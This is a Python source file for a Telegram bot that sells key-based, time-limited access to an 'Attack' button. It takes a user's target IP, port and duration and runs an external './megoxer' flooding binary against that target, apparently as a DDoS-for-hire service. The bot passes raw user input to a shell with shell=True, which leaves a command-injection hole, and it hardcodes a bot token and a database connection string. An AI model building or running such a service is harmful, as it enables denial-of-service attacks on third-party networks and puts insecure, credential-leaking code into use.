import os
import time
import random
import string
import telebot
import datetime
import subprocess
import threading
from pymongo import MongoClient
from telebot import types
from dateutil.relativedelta import relativedelta

# Insert your Telegram bot token here
bot = telebot.TeleBot('7556718869:AAG0-KM11SQdduiT2jnXhdC8lvdOBTf-CR8')

# Admin user IDs
admin_id = {"7469108296"}

# Connect to the MongoDB database
client = MongoClient("mongodb+srv://private:private@monarch.pydws.mongodb.net/?retryWrites=true&w=majority&appName=MONARCH")
db = client["monarch"]
users_collection = db["users"]
keys_collection = db["keys"]

# Files for data storage
KEY_DURATION = {"1day", "1month", "1hour", "7days"}
LOG_FILE = "log.txt"

# In-memory storage
last_attack_time = {}

# To use MongoDB for storing user data
def load_data():
    global users, keys
    users = read_users()
    keys = read_keys()

def read_users():
    # Retrieve all users from the 'users' collection
    users_data = users_collection.find()
    users_dict = {str(user["_id"]): user["expiration"] for user in users_data}
    return users_dict

def save_users():
    # Clear the current users collection and insert the new users
    users_collection.delete_many({})
    users_collection.insert_many([{"_id": user_id, "expiration": expiration} for user_id, expiration in users.items()])

def read_keys():
    # Retrieve all keys from the 'keys' collection
    keys_data = keys_collection.find()
    keys_dict = {key["_id"]: {"duration": key["duration"], "expiration_time": key["expiration_time"]} for key in keys_data}
    return keys_dict

def save_keys():
    # Clear the current keys collection and insert the new keys
    keys_collection.delete_many({})
    keys_collection.insert_many([{"_id": key, "duration": data["duration"], "expiration_time": data["expiration_time"]} for key, data in keys.items()])

def generate_key(length=10):
    characters = string.ascii_letters + string.digits
    random_key = ''.join(random.choice(characters) for _ in range(length))
    custom_key = f"MEG-VIP-{random_key.upper()}"
    
    # Store the key in the database (initially no expiration)
    keys_collection.insert_one({"_id": custom_key, "duration": None, "expiration_time": None})
    return custom_key

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    current_time = datetime.datetime.now()
    new_time = current_time + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)
    return new_time
            
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


@bot.message_handler(commands=['genkey'])
def generate_key_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        # Create the inline keyboard for key duration selection
        markup = types.InlineKeyboardMarkup()
        for duration in KEY_DURATION:
            button = types.InlineKeyboardButton(duration.capitalize(), callback_data=f"genkey_{duration}")
            markup.add(button)
        
        response = "✅ 𝗦𝗲𝗹𝗲𝗰𝘁 𝗸𝗲𝘆 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻:"
        bot.reply_to(message, response, reply_markup=markup)
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"
        bot.reply_to(message, response, parse_mode='Markdown')
        
@bot.callback_query_handler(func=lambda call: call.data.startswith("genkey_"))
def handle_genkey_duration(call):
    duration = call.data.split("_")[1].lower()  # Get the selected duration (e.g., '1hour', '1day', etc.)
    
    # Check if the duration is valid
    if duration not in KEY_DURATION:
        bot.answer_callback_query(call.id, "❗️ Invalid duration.", show_alert=True)
        return

    # Generate the key
    key = generate_key()
    expiration_time = None  # Will be set upon redemption
    
    # Add the key to the dictionary without expiration
    keys[key] = {"duration": duration, "expiration_time": expiration_time}
    save_keys()

    response = f"✅ 𝗞𝗲𝘆 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ✅\n\n𝗞𝗲𝘆: `{key}`\n𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {duration}\n𝗦𝘁𝗮𝘁𝘂𝘀: Not activated"

    # Remove the inline keyboard after the button is clicked by editing the message
    bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
    
    # Send the response as a message and acknowledge the callback
    bot.send_message(call.message.chat.id, response, parse_mode='Markdown')
    bot.answer_callback_query(call.id)
    
@bot.message_handler(func=lambda message: message.text == "🎟️ Redeem Key")
def redeem_key_prompt(message):
    bot.reply_to(message, "𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗸𝗲𝘆:")
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    user_id = str(message.chat.id)
    key = message.text.strip()

    if keys_collection.find_one({"_id": key}):
        # Check if the user already has VIP access
        if users_collection.find_one({"_id": user_id}):
            current_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
            if datetime.datetime.now() < current_expiration:
                bot.reply_to(message, f"❕𝗬𝗼𝘂 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘃𝗲 𝗮𝗰𝗰𝗲𝘀𝘀❕")
                return
            else:
                users_collection.delete_one({"_id": user_id})  # Remove expired access

        # Set the expiration time based on the key's duration
        duration = keys[key]["duration"]
        if duration == "1hour":
            expiration_time = add_time_to_current_date(hours=1)
        elif duration == "1day":
            expiration_time = add_time_to_current_date(days=1)
        elif duration == "7days":
            expiration_time = add_time_to_current_date(days=7)
        elif duration == "1month":
            expiration_time = add_time_to_current_date(months=1)
        else:
            bot.reply_to(message, "Invalid duration in key.")
            return

        # Add user to the authorized list
        users_collection.insert_one({"_id": user_id, "expiration": expiration_time.strftime('%Y-%m-%d %H:%M:%S')})

        # Remove the used key
        keys_collection.delete_one({"_id": key})

        bot.reply_to(message, f"✅ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗴𝗿𝗮𝗻𝘁𝗲𝗱!\n\n𝗲𝘅𝗽𝗶𝗿𝗲𝘀 𝗼𝗻: {expiration_time.strftime('%Y-%m-%d %H:%M:%S')}")
    else:
        bot.reply_to(message, "📛 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗼𝗿 𝗲𝘅𝗽𝗶𝗿𝗲𝗱 𝗸𝗲𝘆 📛")

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found"
                bot.reply_to(message, response)
        else:
            response = "No data found"
            bot.reply_to(message, response)
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"
        bot.reply_to(message, response)

@bot.message_handler(commands=['start'])
def start_command(message):
    """Start command to display the main menu."""
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    attack_button = types.KeyboardButton("🚀 Attack")
    myinfo_button = types.KeyboardButton("👤 My Info")
    redeem_button = types.KeyboardButton("🎟️ Redeem Key")
    markup.add(attack_button, myinfo_button, redeem_button)
    bot.reply_to(message, "𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗺𝗲𝗴𝗼𝘅𝗲𝗿 𝗯𝗼𝘁!", reply_markup=markup)

COOLDOWN_PERIOD = 5 * 60  # 5 minutes

@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def handle_attack(message):
    user_id = str(message.chat.id)
    user = users_collection.find_one({"_id": user_id})
    
    if user:
        # Parse the expiration date from the MongoDB document
        expiration_date = datetime.datetime.strptime(user['expiration'], '%Y-%m-%d %H:%M:%S')
        
        # Check if the access is expired
        if datetime.datetime.now() > expiration_date:
            # Remove expired access from the MongoDB
            users_collection.delete_one({"_id": user_id})
            response = "❗️Your access has expired. Please redeem a key for renewed access."
            bot.reply_to(message, response)
            return

        # Check if cooldown period has passed
        if user_id in last_attack_time:
            time_since_last_attack = (datetime.datetime.now() - last_attack_time[user_id]).total_seconds()
            if time_since_last_attack < COOLDOWN_PERIOD:
                remaining_cooldown = COOLDOWN_PERIOD - time_since_last_attack
                response = f"⌛️ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗶𝗻 𝗲𝗳𝗳𝗲𝗰𝘁 𝘄𝗮𝗶𝘁 {int(remaining_cooldown)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"
                bot.reply_to(message, response)
                return  # Prevent the attack from proceeding

        # Prompt the user for attack details
        response = "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗶𝗽, 𝗽𝗼𝗿𝘁 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲"
        bot.reply_to(message, response)
        bot.register_next_step_handler(message, process_attack_details)

    else:
        response = "⛔️ 𝗨𝗻𝗮𝘂𝘁𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! ⛔️\n\nOops! It seems like you don't have permission to use the Attack command. To gain access and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an admin now and level up your experience!\n\nLet's get you the access you need!"
        bot.reply_to(message, response)

def process_attack_details(message):
    user_id = str(message.chat.id)
    details = message.text.split()

    if len(details) == 3:
        target = details[0]
        try:
            port = int(details[1])
            time = int(details[2])
            if time > 240:
                response = "❗️𝗘𝗿𝗿𝗼𝗿: 𝘂𝘀𝗲 𝗹𝗲𝘀𝘀𝘁𝗵𝗲𝗻 240 𝘀𝗲𝗰𝗼𝗻𝗱𝘀❗️"
            else:
                # Record and log the attack
                log_command(user_id, target, port, time)
                full_command = f"./megoxer {target} {port} {time}"
                username = message.from_user.username if message.from_user.username else message.from_user.first_name
                # Send immediate response that the attack is being executed
                response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n𝗧𝗶𝗺𝗲: {time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: @{username}"

                # Run attack asynchronously (this won't block the bot)
                subprocess.Popen(full_command, shell=True)
                
                # After attack time finishes, notify user
                threading.Timer(time, send_attack_finished_message, [message.chat.id, target, port, time]).start()

                # Update the last attack time for the user
                last_attack_time[user_id] = datetime.datetime.now()

        except ValueError:
            response = "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗼𝗿𝘁 𝗼𝗿 𝘁𝗶𝗺𝗲 𝗳𝗼𝗿𝗺𝗮𝘁."
    else:
        response = "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁"
        
    bot.reply_to(message, response)

def send_attack_finished_message(chat_id, target, port, time):
    """Notify the user that the attack is finished."""
    message = f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱! ✅"
    bot.send_message(chat_id, message)
    
@bot.message_handler(func=lambda message: message.text == "👤 My Info")
def my_info(message):
    user_id = str(message.chat.id)
    user_status = "Admin" if user_id in admin_id else "User"
    username = message.from_user.username if message.from_user.username else message.from_user.first_name

    # Check if the user is in the database
    user = users_collection.find_one({"_id": user_id})
    if user:
        expiration_date = datetime.datetime.strptime(user['expiration'], '%Y-%m-%d %H:%M:%S')
        remaining_time = expiration_date - datetime.datetime.now()

        if remaining_time.total_seconds() > 0:
            remaining_time_str = str(remaining_time).split(".")[0]  # Remove microseconds part
            expiration_info = f"• 𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: {remaining_time_str}"
        else:
            expiration_info = "• 𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: 𝗘𝘅𝗽𝗶𝗿𝗲𝗱 ⛔️"

    else:
        expiration_info = "• 𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: N/A"

    response = (
        f"👤 𝗬𝗢𝗨𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 👤\n\n"
        f"• 𝗦𝘁𝗮𝘁𝘂𝘀: {user_status}\n"
        f"• 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{username}\n"
        f"• 𝗨𝘀𝗲𝗿 𝗜𝗗: {user_id}\n"
        f"{expiration_info}\n"
    )
    bot.reply_to(message, response, parse_mode="Markdown")
    
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)

    if user_id not in admin_id:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /𝗿𝗲𝗺𝗼𝘃𝗲 <𝗨𝘀𝗲𝗿_𝗜𝗗>")
        return

    target_user_id = command[1]

    if users_collection.find_one({"_id": target_user_id}):
        # Remove the user from the database
        users_collection.delete_one({"_id": target_user_id})
        response = f"✅ 𝗨𝘀𝗲𝗿 {target_user_id} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝘀𝘂𝗰𝗰𝗲𝘀𝘂𝗹𝗹𝘆 𝗿𝗲𝗺𝗼𝘃𝗲𝗱"
    else:
        response = f"⚠️ 𝗨𝘀𝗲𝗿 {target_user_id} 𝗶𝘀 𝗻𝗼𝘁 𝗶𝗻 𝘁𝗵𝗲 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘂𝘀𝗲𝗿𝘀 𝗹𝗶𝘀𝘁"

    bot.reply_to(message, response)
    
@bot.message_handler(commands=['users'])
def show_all_users(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"
        bot.reply_to(message, response)
        return
    
    # Get all users from the database
    users_data = list(users_collection.find())
    
    if len(users_data) == 0:
        response = "⚠️ No authorized users found."
        bot.reply_to(message, response)
        return
    
    response = "📝 𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗨𝘀𝗲𝗿𝘀:\n\n"
    
    for user in users_data:
        user_expiration = datetime.datetime.strptime(user["expiration"], '%Y-%m-%d %H:%M:%S')
        
        # Calculate remaining time
        remaining_time = user_expiration - datetime.datetime.now()
        
        # If the access has expired
        if remaining_time.total_seconds() <= 0:
            remaining_time_str = "Expired"
        else:
            days = remaining_time.days
            hours, remainder = divmod(remaining_time.seconds, 3600)
            minutes, seconds = divmod(remainder, 60)
            remaining_time_str = f"{days}days, {hours}hr, {minutes}min"
        
        response += f"• 𝗨𝘀𝗲𝗿 𝗜𝗗: {user['_id']} - 𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: {remaining_time_str}\n\n"
    
    bot.reply_to(message, response)
    
@bot.message_handler(commands=['check'])
def check_user_details(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"
        bot.reply_to(message, response)
        return
    
    # Extract the user_id to check from the message (after the command)
    try:
        check_user_id = int(message.text.split()[1])  # Get the user ID from the message
    except (IndexError, ValueError):
        bot.reply_to(message, "Usage: /check <user id>")
        return
    
    try:
        # Retrieve user information from Telegram
        chat_info = bot.get_chat(check_user_id)  # This gets information about the user based on their ID
        
        # Check if the user has a username
        username = chat_info.username if chat_info.username else "Not available"
        first_name = chat_info.first_name if chat_info.first_name else "Not available"
        last_name = chat_info.last_name if chat_info.last_name else "Not available"
        
        # Format the response
        response = f"📋 𝗨𝘀𝗲𝗿 𝗗𝗲𝘁𝗮𝗶𝗹𝘀:\n"
        response += f"• 𝗙𝗶𝗿𝘀𝘁 𝗡𝗮𝗺𝗲: {first_name}\n"
        response += f"• 𝗟𝗮𝘀𝘁 𝗡𝗮𝗺𝗲: {last_name}\n"
        response += f"• 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{username}\n"
    
    except Exception as e:
        response = f"⚠️ 𝗨𝘀𝗲𝗿 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱 or 𝗮𝗻 𝗲𝗿𝗿𝗼𝗿 occurred: {str(e)}"
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)

    if user_id not in admin_id:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱")
        return

    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /𝗮𝗱𝗱 <𝗨𝘀𝗲𝗿_𝗜𝗗> <𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻_𝗮𝗻𝗱_𝗨𝗻𝗶𝘁 (e.g. 1hour, 1day)>")
        return

    target_user_id = command[1]
    duration_input = command[2].lower()

    # Validate if the duration is in the correct format (e.g. 1hour, 1day)
    if "hour" in duration_input:
        try:
            duration_value = int(duration_input.replace('hour', ''))
            expiration_time = add_time_to_current_date(hours=duration_value)
        except ValueError:
            bot.reply_to(message, "❗️ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗽𝗿𝗼𝘃𝗶𝗱𝗲 𝗮 𝗻𝘂𝗺𝗯𝗲𝗿 𝗳𝗼𝗿 𝗵𝗼𝘂𝗿𝘀.")
            return
    elif "day" in duration_input:
        try:
            duration_value = int(duration_input.replace('day', ''))
            expiration_time = add_time_to_current_date(days=duration_value)
        except ValueError:
            bot.reply_to(message, "❗️ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗽𝗿𝗼𝘃𝗶𝗱𝗲 𝗮 𝗻𝘂𝗺𝗯𝗲𝗿 𝗳𝗼𝗿 𝗱𝗮𝘆𝘀.")
            return
    else:
        bot.reply_to(message, "❗️ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗽𝗿𝗼𝘃𝗶𝗱𝗲 𝗮 𝗰𝗼𝗿𝗿𝗲𝗰𝘁 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 (e.g. 1hour, 1day).")
        return

    # Check if the user already has access
    if users_collection.find_one({"_id": target_user_id}):
        bot.reply_to(message, f"❗️ 𝗨𝘀𝗲𝗿 {target_user_id} 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘃𝗲𝘀 𝗮𝗰𝗰𝗲𝘀𝘀.")
    else:
        # Add the user with the calculated expiration time
        users_collection.insert_one({"_id": target_user_id, "expiration": expiration_time.strftime('%Y-%m-%d %H:%M:%S')})
        bot.reply_to(message, f"✅ 𝗨𝘀𝗲𝗿 {target_user_id} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗮𝗱𝗱𝗲𝗱 𝘄𝗶𝘁𝗵 𝗮𝗰𝗰𝗲𝘀𝘀 𝗳𝗼𝗿 {duration_value} {'hour' if 'hour' in duration_input else 'day'}.")
    
if __name__ == "__main__":
    load_data()
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(e)
            # Add a small delay to avoid rapid looping in case of persistent errors
        time.sleep(1)